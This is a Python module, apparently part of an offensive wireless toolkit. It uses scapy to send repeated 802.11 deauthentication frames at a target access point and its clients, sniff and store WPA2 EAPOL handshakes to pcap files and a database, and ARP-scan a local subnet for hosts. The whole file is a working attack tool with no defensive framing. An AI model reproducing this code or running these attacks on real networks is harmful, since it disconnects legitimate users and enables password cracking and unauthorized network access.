# backend/drivers/wifi/wifi_lan.py
import threading
import time
import os
from datetime import datetime
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, ARP, Ether, srp
from scapy.all import sniff, EAPOL

from backend.core.socket_manager import socket_manager
from backend.database import SessionLocal
from backend.models import WiFiCapture, WiFiClient

class WiFiLAN:
    def __init__(self):
        self._deauth_thread = None
        self._sniffer_thread = None
        self.is_deauthing = False
        self.target_bssid = None
        self.handshake_captured = False

    def trigger_deauth(self, iface: str, bssid: str, client: str = "FF:FF:FF:FF:FF:FF", count: int = 45):
        self.target_bssid = bssid
        self.is_deauthing = True
        
        def _run():
            print(f"[LAN ATTACK] Lanzando ráfaga Deauth -> AP: {bssid} | Cliente: {client}")
            pkt = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
            
            for _ in range(count):
                if not self.is_deauthing: break
                sendp(pkt, iface=iface, verbose=False, count=1)
                time.sleep(0.05)
            self.is_deauthing = False
            print("[LAN ATTACK] Inyección completada.")

        self._deauth_thread = threading.Thread(target=_run, daemon=True)
        self._deauth_thread.start()

    def start_handshake_sniffer(self, iface: str, bssid: str):
        self.handshake_captured = False
        def _packet_filter(pkt):
            if self.handshake_captured: return
            if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
                addr1, addr2, addr3 = pkt[Dot11].addr1, pkt[Dot11].addr2, pkt[Dot11].addr3
                if bssid.lower() in [str(addr1).lower(), str(addr2).lower(), str(addr3).lower()]:
                    print(f"[WIFI KERNEL] EAPOL interceptado para {bssid}")
                    self._save_handshake(bssid, pkt)

        self._sniffer_thread = threading.Thread(target=lambda: sniff(iface=iface, prn=_packet_filter, stop_filter=lambda p: self.handshake_captured, timeout=45), daemon=True)
        self._sniffer_thread.start()

    def _save_handshake(self, bssid: str, packet):
        self.handshake_captured = True
        os.makedirs("backend/storage/handshakes", exist_ok=True)
        filename = f"backend/storage/handshakes/handshake_{bssid.replace(':', '')}.pcap"
        from scapy.utils import wrpcap
        wrpcap(filename, packet, append=True)
        
        db = SessionLocal()
        try:
            db.add(WiFiCapture(ssid="Red Interceptada", bssid=bssid, channel=1, encryption="WPA2", capture_type="HANDSHAKE", payload_path=filename, timestamp=datetime.utcnow()))
            db.commit()
            # 🟢 CORRECCIÓN: Envío nativo de firma estricta (Modulo, Data)
            socket_manager.broadcast_sync("WIFI_HANDSHAKE", {"bssid": bssid, "status": "SUCCESS", "path": filename})
        except Exception as e:
            print(f"[ORM ERR] {e}")
        finally:
            db.close()

    def trigger_arp_scan(self, iface: str, ip_range: str):
        def _run():
            print(f"[LAN SCAN] Mapeando topología local en {ip_range} vía {iface}")
            try:
                answered, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range), iface=iface, timeout=3, verbose=False)
                db = SessionLocal()
                hosts_detectados = []
                
                for _, rcved in answered:
                    ip, mac = rcved.psrc, rcved.hwsrc
                    client_row = db.query(WiFiClient).filter(WiFiClient.mac == mac).first()
                    if not client_row:
                        client_row = WiFiClient(mac=mac, client_type="LAN_HOST", last_seen=datetime.utcnow())
                        db.add(client_row)
                    client_row.ip_address = ip
                    client_row.last_seen = datetime.utcnow()
                    db.commit()
                    hosts_detectados.append({"ip": ip, "mac": mac})
                
                print(f"[LAN SCAN WS] Despachando {len(hosts_detectados)} hosts a la interfaz táctil.")
                # 🟢 CORRECCIÓN: Evitamos el doble empaquetado. Mandamos la lista cruda directo al canal.
                socket_manager.broadcast_sync("WIFI_LAN_HOSTS", hosts_detectados)
            except Exception as e:
                print(f"[LAN SCAN ERR] {e}")
            finally:
                db.close()

        threading.Thread(target=_run, daemon=True).start()

wifi_lan = WiFiLAN()